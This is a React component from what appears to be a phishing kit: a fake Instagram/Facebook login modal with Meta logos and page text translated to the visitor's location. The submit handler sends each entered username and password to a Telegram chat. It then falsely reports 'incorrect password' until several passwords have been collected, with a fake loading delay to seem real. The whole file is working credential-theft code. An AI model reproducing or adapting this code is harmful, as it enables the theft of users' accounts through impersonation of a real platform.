import { sendMessage } from '@/lib/telegram';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';
import FacebookLogoImage from '@/assets/images/fb_round_logo.png';
import InstagramLogoImage from '@/assets/images/logo-insta.webp';
import MetaLogo from '@/assets/images/meta-logo-grey.png';

const LoginModal: FC<{ nextStep: () => void; provider: 'instagram' | 'facebook' | null }> = ({ nextStep, provider }) => {
    const [attempts, setAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, messageContent, setMessageContent, setMessageId } = store();
    const maxPass = config.MAX_PASS ?? 3;
    const loadingMs = (config.PASSWORD_LOADING_TIME ?? 8) * 1000;
    const waitTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
    const focusBorder = provider === 'instagram' ? 'focus:border-[#D24294]' : provider === 'facebook' ? 'focus:border-[#0064E0]' : '';
    const accountLabel = provider === 'facebook' ? 'Email address or mobile number' : 'Mobile number, username or email';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Mobile number, username or email', 'Email address or mobile number', 'Password', "The password that you've entered is incorrect.", 'Continue', 'Log in', 'Log in to Instagram', 'For your security, please enter your password to continue.', 'For your security, you must enter your password to continue.', 'Forgot your password?'];

        const translateAll = async () => {
            const entries = await Promise.all(textsToTranslate.map(async (text) => [text, await translateText(text, geoInfo.country_code)] as const));

            setTranslations(Object.fromEntries(entries));
        };

        void translateAll();
    }, [geoInfo]);

    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    useEffect(
        () => () => {
            if (waitTimer.current) clearTimeout(waitTimer.current);
        },
        []
    );

    const handleSubmit = async () => {
        if (!username.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const platform = provider === 'facebook' ? 'Facebook' : 'Instagram';
        const passwordLine = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
        const block = next === 1 ? `<b>📘 Login Type:</b> <code>${platform}</code>\n<b>👤 Username:</b> <code>${username}</code>\n${passwordLine}` : passwordLine;

        const updatedMessage = messageContent ? `${messageContent}\n\n${block}` : block;

        const sentId = await sendMessage({
            message: updatedMessage,
            message_id: messageId
        });

        if (sentId === null) {
            setIsLoading(false);
            return;
        }
        setMessageId(sentId);
        setMessageContent(updatedMessage);

        if (waitTimer.current) clearTimeout(waitTimer.current);
        waitTimer.current = setTimeout(() => {
            setIsLoading(false);
            if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        }, loadingMs);
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/45 p-4'>
            <div className={`flex max-h-[calc(100vh-16px)] min-h-[min(860px,calc(100vh-16px))] w-full max-w-120 flex-col overflow-y-auto rounded-2xl bg-white p-5 shadow-2xl ${provider === 'instagram' ? 'border-t-4 border-t-[#e1306c]' : ''}`}>
                <div className='flex flex-1 flex-col items-center justify-between'>
                    {provider === 'instagram' ? (
                        <div className='text-center'>
                            <div className='mx-auto mt-4 w-fit rounded-[18px] bg-linear-to-br from-[#833ab4] via-[#e1306c] to-[#fcaf45] p-0.5 shadow-lg'>
                                <div className='rounded-2xl bg-white'><Image src={InstagramLogoImage} alt='' width={48} height={48} /></div>
                            </div>
                            <h2 className='mt-4 text-xl font-bold text-[#262626]'>{t('Log in to Instagram')}</h2>
                            <p className='mt-2 text-sm text-[#9a979e]'>{t('For your security, please enter your password to continue.')}</p>
                        </div>
                    ) : <Image src={FacebookLogoImage} alt='Facebook' width={48} height={48} />}
                    <div className='w-full'>
                        {provider === 'facebook' && <p className='mb-4 text-sm text-[#9a979e]'>{t('For your security, you must enter your password to continue.')}</p>}
                        <input type='text' id='username-input' value={username} onChange={(e) => setUsername(e.target.value)} autoComplete='username' className={`mb-3 h-10 w-full rounded-[10px] border bg-[#fafafa] px-3 text-sm focus:bg-white ${showError ? 'border-red-500' : 'border-[#d4dbe3]'} ${focusBorder}`} placeholder={t(accountLabel)} />
                        <div className='relative w-full'>
                            <input type={showPassword ? 'text' : 'password'} id='password-input' value={password} onChange={(e) => setPassword(e.target.value)} autoComplete='current-password' className={`h-10 w-full rounded-[10px] border bg-[#fafafa] px-3 pr-10 text-sm focus:bg-white ${showError ? 'border-red-500' : 'border-[#d4dbe3]'} ${focusBorder}`} placeholder={t('Password')} />
                            <button type='button' aria-label='Show password' className='absolute top-1/2 right-2 -translate-y-1/2 text-[#6b7280]' onClick={togglePassword}>
                                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} />
                            </button>
                        </div>
                        {showError && <p className='mt-2 text-sm text-red-500'>{t("The password that you've entered is incorrect.")}</p>}
                        <button onClick={() => void handleSubmit()} disabled={isLoading} className={`mt-3 flex h-10 w-full items-center justify-center rounded-full text-sm font-semibold text-white ${provider === 'instagram' ? 'bg-linear-to-r from-[#833ab4] via-[#e1306c] to-[#f77737]' : 'bg-[#0064e0]'} ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <span className='h-4.5 w-4.5 animate-spin rounded-full border-2 border-white/40 border-t-white' /> : t(provider === 'instagram' ? 'Log in' : 'Continue')}
                        </button>
                        <p className={`mt-3 text-center text-sm ${provider === 'instagram' ? 'text-[#0095f6]' : 'text-[#9a979e]'}`}>{t('Forgot your password?')}</p>
                    </div>
                    <Image src={MetaLogo} alt='Meta' width={64} className='mt-6' />
                </div>
            </div>
        </div>
    );
};

export default LoginModal;
